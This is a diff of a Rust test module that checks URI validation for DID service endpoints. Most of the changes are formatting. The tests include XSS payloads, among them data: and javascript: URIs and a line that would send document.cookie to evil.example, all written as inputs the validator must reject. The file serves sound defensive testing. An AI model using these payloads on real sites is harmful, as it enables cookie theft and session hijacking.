@@ -315,7 +315,7 @@ mod tests {
     fn did_scheme_is_accepted() {
         // A DID URL is a valid service endpoint per DID Core.
         let ep = ServiceEndpoint::uri("did:stellar:testnet:GABC#linked-domain");
-        assert!(ep.is_ok(), "did: scheme must be accepted, got: {:?}", ep);
+        assert!(ep.is_ok(), "did: scheme must be accepted, got: {ep:?}");
     }
 
     #[test]
@@ -336,8 +336,7 @@ mod tests {
 
     #[test]
     fn data_scheme_is_rejected() {
-        let err =
-            ServiceEndpoint::uri("data:text/html,<script>alert(1)</script>").unwrap_err();
+        let err = ServiceEndpoint::uri("data:text/html,<script>alert(1)</script>").unwrap_err();
         assert!(
             matches!(err, DidError::InvalidScheme { ref scheme, .. } if scheme == "data"),
             "unexpected error: {err:?}"
@@ -453,10 +452,8 @@ mod tests {
         // defence-in-depth path we are testing here).
         let bad_ep = ServiceEndpoint(
             // Private field — craft via json round-trip
-            serde_json::from_value::<ServiceEndpoint>(serde_json::json!(
-                "javascript:alert(1)"
-            ))
-            .expect("deserialize"),
+            serde_json::from_value::<String>(serde_json::json!("javascript:alert(1)"))
+                .expect("deserialize"),
         );
         let svc = Service {
             id: "did:stellar:testnet:GABC#bad".to_string(),
@@ -528,8 +525,14 @@ mod tests {
 
         let value: serde_json::Value = serde_json::to_value(&doc).unwrap();
         assert_eq!(value["id"].as_str(), Some("did:stellar:testnet:GABC"));
-        assert_eq!(value["service"][0]["service_endpoint"].as_str(), Some("https://hub.example.com"));
-        assert_eq!(value["service"][0]["service_type"].as_str(), Some("LinkedDomains"));
+        assert_eq!(
+            value["service"][0]["service_endpoint"].as_str(),
+            Some("https://hub.example.com")
+        );
+        assert_eq!(
+            value["service"][0]["service_type"].as_str(),
+            Some("LinkedDomains")
+        );
     }
 
     // ── Integration: full document publication workflow ───────────────────────
@@ -563,10 +566,13 @@ mod tests {
     fn full_publication_workflow_rejects_dangerous_endpoint_before_publication() {
         // A document that attempts to add a dangerous endpoint must fail
         // before the service is committed to the document.
-        let mut document = DidDocument::new("did:stellar:testnet:GABC");
+        let document = DidDocument::new("did:stellar:testnet:GABC");
 
         // This endpoint would be dangerous in a browser-rendered resolver UI.
-        let err = ServiceEndpoint::uri("javascript:void(document.location='http://evil.example/steal?c='+document.cookie)").unwrap_err();
+        let err = ServiceEndpoint::uri(
+            "javascript:void(document.location='http://evil.example/steal?c='+document.cookie)",
+        )
+        .unwrap_err();
         assert!(matches!(err, DidError::InvalidScheme { .. }));
 
         // The document was never modified.
